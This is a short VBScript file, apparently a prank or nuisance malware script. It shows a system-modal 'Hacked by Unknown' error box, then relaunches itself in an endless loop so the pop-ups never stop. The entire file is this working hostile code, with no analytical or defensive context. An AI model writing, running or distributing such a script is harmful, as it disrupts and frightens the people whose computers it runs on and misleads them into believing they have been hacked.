MsgBox "Hacked by Unknown",4096+16,"Hacked by Unknown"
If Not WScript.Arguments.Named.Exists("task") Then
    Do
        CreateObject("WScript.Shell").Run """" & WScript.FullName & """ """ & WScript.ScriptFullName & """ ""/task""", 1, True
    Loop
End If

